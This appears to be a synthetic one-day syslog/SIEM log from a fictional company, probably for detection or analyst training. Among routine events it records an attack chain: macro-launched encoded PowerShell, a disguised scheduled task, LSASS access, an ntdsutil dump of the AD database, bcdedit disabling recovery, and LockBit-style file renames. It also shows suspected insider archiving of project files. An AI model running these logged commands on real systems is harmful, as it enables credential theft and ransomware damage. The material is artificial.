+<132>1 2026-09-14T06:15:02Z print-srv-01 Windows-Firewall - - [aegis@32473 severity="warning"] Port scan detected from 10.50.1.10: 1,000 blocked inbound connection attempts in 12 s
+<134>1 2026-09-14T06:41:21Z ops-ws-008 sysmon - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\s.ahmed CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-14T06:41:44Z print-srv-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/certbot )
+<134>1 2026-09-14T06:42:36Z rnd-ws-117 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\a.mehta"] EventID=4624 An account was successfully logged on. Subject=CORP\a.mehta LogonType=2 Workstation=RND-WS-117 Source Network Address=10.20.15.117
+<133>1 2026-09-14T07:04:09Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="k.olsen"] k.olsen : TTY=pts/0 ; PWD=/home/k.olsen ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-14T07:21:14Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4624 An account was successfully logged on. Subject=CORP\r.tanaka LogonType=2 Workstation=ADM-WS-002 Source Network Address=10.20.10.2
+<134>1 2026-09-14T07:24:22Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for k.olsen from 10.20.10.8 port 56006 ssh2: ED25519 SHA256:rnv7bbgnt6hmyu57vtvn
+<134>1 2026-09-14T07:30:00Z web-dmz-02 systemd - - [aegis@32473 severity="info"] Started Session 4412 of user root.
+<133>1 2026-09-14T07:30:42Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="k.olsen"] k.olsen : TTY=pts/0 ; PWD=/home/k.olsen ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+<134>1 2026-09-14T07:50:51Z ops-ws-008 sysmon - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\s.ahmed CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-14T07:59:59Z dc01 kernel - - [aegis@32473 severity="info"] [809171.982079] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-14T08:05:33Z print-srv-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/logrotate )
+<133>1 2026-09-14T08:41:35Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_backup"] svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-14T08:50:43Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.15.55 to 1a:a9:52:26:f8:cb (eng-ws-055) via eth0
+<133>1 2026-09-14T08:54:19Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="k.olsen"] k.olsen : TTY=pts/0 ; PWD=/home/k.olsen ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+<134>1 2026-09-14T08:55:24Z fin-ws-043 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=4624 An account was successfully logged on. Subject=CORP\p.singh LogonType=2 Workstation=FIN-WS-043 Source Network Address=10.20.14.43
+<132>1 2026-09-14T09:21:47Z fin-ws-042 sysmon - - [aegis@32473 severity="warning" user="CORP\j.okafor"] EventID=1 ProcessCreate Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..." User=CORP\j.okafor ParentCommandLine="WINWORD.EXE /n C:\Users\j.okafor\Downloads\Q3_Budget_Review.docm"
+<133>1 2026-09-14T09:26:30Z fin-ws-042 Microsoft-Windows-TaskScheduler - - [aegis@32473 severity="notice" user="CORP\j.okafor"] EventID=106 Task registered: \Microsoft\Windows\OneDriveUpdaterTask by CORP\j.okafor; action rundll32.exe C:\Users\j.okafor\AppData\Roaming\svchost32.dll,Start; trigger: at logon and every 30 minutes
+<134>1 2026-09-14T09:34:28Z vpn-gw-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/apt/apt.systemd.daily )
+<134>1 2026-09-14T09:37:33Z backup-01 kernel - - [aegis@32473 severity="info"] [442934.267265] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-14T09:55:14Z ops-ws-008 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=4634 An account was logged off. Subject=CORP\s.ahmed LogonType=2
+<131>1 2026-09-14T10:05:12Z fin-ws-042 sysmon - - [aegis@32473 severity="err" user="CORP\j.okafor"] EventID=10 ProcessAccess SourceImage=C:\Windows\System32\rundll32.exe TargetImage=C:\Windows\System32\lsass.exe GrantedAccess=0x1010 CallTrace=C:\Users\j.okafor\AppData\Roaming\svchost32.dll+0x1a2f
+<134>1 2026-09-14T10:09:11Z web-dmz-02 sshd - - [aegis@32473 severity="info"] Accepted publickey for k.olsen from 10.20.10.5 port 49883 ssh2: ED25519 SHA256:3xzo9levmhe267qbmpme
+<134>1 2026-09-14T10:42:41Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_backup from 10.20.10.7 port 46048 ssh2: ED25519 SHA256:4i322i5szby1qogefq21
+<134>1 2026-09-14T10:51:33Z eng-ws-055 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\t.berg"] EventID=4624 An account was successfully logged on. Subject=CORP\t.berg LogonType=2 Workstation=ENG-WS-055 Source Network Address=10.20.15.55
+<130>1 2026-09-14T10:52:41Z dc01 sysmon - - [aegis@32473 severity="crit" user="CORP\svc_backup"] EventID=1 ProcessCreate Image=C:\Windows\System32\ntdsutil.exe CommandLine="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\Windows\Temp\ifm\" q q" User=CORP\svc_backup ParentImage=C:\Windows\System32\cmd.exe
+<134>1 2026-09-14T10:52:57Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'Nightly-FileServers' completed successfully: 216 GB processed, 0 warnings.
+<134>1 2026-09-14T11:14:50Z web-dmz-02 systemd - - [aegis@32473 severity="info"] Started Cleanup of Temporary Directories.
+<134>1 2026-09-14T11:16:07Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for r.tanaka from 10.20.10.2 port 46017 ssh2: ED25519 SHA256:gz2c2zpajy2iiu1iaxga
+<134>1 2026-09-14T11:21:24Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.15.117 to 6a:71:41:47:f5:4f (rnd-ws-117) via eth0
+<134>1 2026-09-14T11:22:15Z eng-ws-055 sysmon - - [aegis@32473 severity="info" user="CORP\t.berg"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\t.berg CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-14T11:48:04Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4624 An account was successfully logged on. Subject=CORP\r.tanaka LogonType=2 Workstation=ADM-WS-002 Source Network Address=10.20.10.2
+<134>1 2026-09-14T12:29:42Z log-ws-031 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\c.dubois"] EventID=4624 An account was successfully logged on. Subject=CORP\c.dubois LogonType=10 Workstation=LOG-WS-031 Source Network Address=10.20.18.31
+<133>1 2026-09-14T12:40:05Z file-srv-02 smbd - - [aegis@32473 severity="notice" user="CORP\a.mehta"] client 10.20.15.117 (CORP\a.mehta) read 641 files under \\file-srv-02\projects\falcon in 11 minutes; typical daily volume for this account is 25
+<133>1 2026-09-14T13:02:18Z rnd-ws-117 sysmon - - [aegis@32473 severity="notice" user="CORP\a.mehta"] EventID=11 FileCreate Image=C:\Program Files\7-Zip\7z.exe TargetFilename=C:\Users\a.mehta\AppData\Local\Temp\proj_falcon.7z Size=1,842,113,024 User=CORP\a.mehta CommandLine="7z.exe a -p -mhe=on proj_falcon.7z Z:\projects\falcon\*"
+<134>1 2026-09-14T13:03:54Z file-srv-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/logrotate )
+<134>1 2026-09-14T13:27:30Z web-dmz-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for r.tanaka from 10.20.10.2 port 41734 ssh2: ED25519 SHA256:sawy8s6eg6ri02l8s43k
+<133>1 2026-09-14T13:32:17Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-14T13:41:29Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4624 An account was successfully logged on. Subject=CORP\r.tanaka LogonType=2 Workstation=ADM-WS-002 Source Network Address=10.20.10.2
+<132>1 2026-09-14T13:46:17Z web-dmz-02 monit - - [aegis@32473 severity="warning"] filesystem / usage 86% exceeds threshold 80%
+<134>1 2026-09-14T13:47:13Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4634 An account was logged off. Subject=CORP\r.tanaka LogonType=2
+<134>1 2026-09-14T14:12:43Z web-dmz-01 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset +0.0088 s
+<134>1 2026-09-14T14:56:15Z file-srv-01 systemd - - [aegis@32473 severity="info"] Started Daily apt download activities.
+<134>1 2026-09-14T15:06:27Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_backup from 10.20.10.6 port 54919 ssh2: ED25519 SHA256:w269kk1w2j0qogzel7rc
+<132>1 2026-09-14T15:22:34Z web-dmz-01 monit - - [aegis@32473 severity="warning"] filesystem / usage 88% exceeds threshold 80%
+<134>1 2026-09-14T15:24:41Z fin-ws-042 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\j.okafor"] EventID=4634 An account was logged off. Subject=CORP\j.okafor LogonType=2
+<134>1 2026-09-14T15:28:41Z rnd-ws-117 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\a.mehta"] EventID=4624 An account was successfully logged on. Subject=CORP\a.mehta LogonType=2 Workstation=RND-WS-117 Source Network Address=10.20.15.117
+<134>1 2026-09-14T15:36:02Z fin-ws-043 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=4624 An account was successfully logged on. Subject=CORP\p.singh LogonType=2 Workstation=FIN-WS-043 Source Network Address=10.20.14.43
+<133>1 2026-09-14T15:44:23Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="svc_backup"] svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/systemctl restart confluence
+<134>1 2026-09-14T15:45:05Z dc01 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset +0.0045 s
+<134>1 2026-09-14T15:45:06Z web-dmz-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for k.olsen from 10.20.10.5 port 50348 ssh2: ED25519 SHA256:r0ozuboe66k0shq5skke
+<134>1 2026-09-14T15:45:50Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_patch from 10.20.10.4 port 59493 ssh2: ED25519 SHA256:b59qaf6vyzyggsrhuuj0
+<133>1 2026-09-14T15:51:34Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/apt update
+<131>1 2026-09-14T16:03:04Z file-srv-02 sysmon - - [aegis@32473 severity="err" user="CORP\svc_fileops"] EventID=1 ProcessCreate Image=C:\Windows\System32\bcdedit.exe CommandLine="bcdedit /set {default} recoveryenabled no" User=CORP\svc_fileops ParentImage=C:\ProgramData\svchost_.exe
+<130>1 2026-09-14T16:06:18Z file-srv-02 fsaudit - - [aegis@32473 severity="crit" user="CORP\svc_fileops"] 12,418 rename operations in 90 s under D:\shares\projects: files renamed with extension .lockbit; process C:\ProgramData\svchost_.exe
+<134>1 2026-09-14T16:09:25Z fin-ws-043 sysmon - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\p.singh CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-14T16:14:36Z rnd-ws-118 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\l.fischer"] EventID=4624 An account was successfully logged on. Subject=CORP\l.fischer LogonType=2 Workstation=RND-WS-118 Source Network Address=10.20.15.118
+<134>1 2026-09-14T16:25:08Z web-dmz-01 systemd - - [aegis@32473 severity="info"] Started Daily apt download activities.
+<134>1 2026-09-14T16:26:21Z rnd-ws-117 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\a.mehta"] EventID=4624 An account was successfully logged on. Subject=CORP\a.mehta LogonType=2 Workstation=RND-WS-117 Source Network Address=10.20.15.117
+<134>1 2026-09-14T16:28:04Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.15.55 to 78:d3:91:78:b1:09 (eng-ws-055) via eth0
+<134>1 2026-09-14T16:41:30Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'Nightly-FileServers' completed successfully: 826 GB processed, 0 warnings.
+<134>1 2026-09-14T16:48:37Z dns-01 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset +0.0069 s
+<134>1 2026-09-14T16:52:03Z fin-ws-043 sysmon - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\p.singh
+<134>1 2026-09-14T16:55:01Z hr-ws-023 Microsoft-Windows-GroupPolicy - - [aegis@32473 severity="info"] EventID=1502 The Group Policy settings for the computer were processed successfully. New settings from 3 Group Policy objects were detected and applied.
+<134>1 2026-09-14T17:06:26Z web-dmz-02 kernel - - [aegis@32473 severity="info"] [508568.989834] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-14T17:06:38Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.14.42 to 72:7b:fe:62:75:07 (fin-ws-042) via eth0
+<134>1 2026-09-14T17:16:24Z hr-ws-023 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=4624 An account was successfully logged on. Subject=CORP\m.novak LogonType=2 Workstation=HR-WS-023 Source Network Address=10.20.16.23
+<134>1 2026-09-14T17:18:09Z web-dmz-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_backup from 10.20.10.3 port 44495 ssh2: ED25519 SHA256:uw72015tawx24p7l7dpd
+<134>1 2026-09-14T17:21:00Z dc02 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset +0.0051 s
+<134>1 2026-09-14T17:32:13Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.14.43 to 2f:43:2e:23:e2:b9 (fin-ws-043) via eth0
+<134>1 2026-09-14T17:37:36Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'Nightly-FileServers' completed successfully: 751 GB processed, 0 warnings.
+<134>1 2026-09-14T17:49:18Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.15.55 to e1:50:bf:ce:ca:02 (eng-ws-055) via eth0
+<134>1 2026-09-14T18:13:37Z eng-ws-055 sysmon - - [aegis@32473 severity="info" user="CORP\t.berg"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\t.berg
+<134>1 2026-09-14T18:16:00Z rnd-ws-117 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\a.mehta"] EventID=4624 An account was successfully logged on. Subject=CORP\a.mehta LogonType=2 Workstation=RND-WS-117 Source Network Address=10.20.15.117
+<134>1 2026-09-14T18:19:38Z mail-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/sysstat/sa1 )
+<134>1 2026-09-14T18:22:16Z ops-ws-008 sysmon - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\s.ahmed CommandLine="chrome.exe --type=renderer"
+<133>1 2026-09-14T18:24:30Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/apt update
+<134>1 2026-09-14T18:26:41Z dc01 systemd - - [aegis@32473 severity="info"] Started Rotate log files.
+<134>1 2026-09-14T18:31:52Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.10.2 to ac:2a:50:20:47:da (adm-ws-002) via eth0
+<134>1 2026-09-14T18:34:55Z hr-ws-023 sysmon - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\m.novak CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-14T18:36:20Z backup-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/logrotate )
+<134>1 2026-09-14T18:48:59Z ops-ws-008 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=4624 An account was successfully logged on. Subject=CORP\s.ahmed LogonType=2 Workstation=OPS-WS-008 Source Network Address=10.20.17.8
+<134>1 2026-09-14T19:35:34Z print-srv-01 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset -0.0020 s
+<134>1 2026-09-14T19:47:28Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.15.117 to 33:e7:4a:d3:ac:48 (rnd-ws-117) via eth0
+<134>1 2026-09-14T19:48:34Z eng-ws-055 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\t.berg"] EventID=4624 An account was successfully logged on. Subject=CORP\t.berg LogonType=7 Workstation=ENG-WS-055 Source Network Address=10.20.15.55
+<134>1 2026-09-14T20:10:12Z web-dmz-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_patch from 10.20.10.6 port 49618 ssh2: ED25519 SHA256:40nojxt5y3cllmq61e0v
+<134>1 2026-09-14T20:25:57Z vpn-gw-01 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset -0.0082 s
+<134>1 2026-09-14T20:33:23Z dns-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/apt/apt.systemd.daily )
+<134>1 2026-09-14T20:53:48Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4624 An account was successfully logged on. Subject=CORP\r.tanaka LogonType=2 Workstation=ADM-WS-002 Source Network Address=10.20.10.2
+<134>1 2026-09-14T21:45:45Z fin-ws-042 sysmon - - [aegis@32473 severity="info" user="CORP\j.okafor"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\j.okafor CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-14T22:20:41Z dns-01 kernel - - [aegis@32473 severity="info"] [659956.445226] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-14T22:40:01Z rnd-ws-117 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\a.mehta"] EventID=4634 An account was logged off. Subject=CORP\a.mehta LogonType=2
+<134>1 2026-09-14T22:55:32Z hr-ws-023 sysmon - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\m.novak
+<134>1 2026-09-14T23:55:25Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.14.43 to 3a:29:5f:74:95:11 (fin-ws-043) via eth0
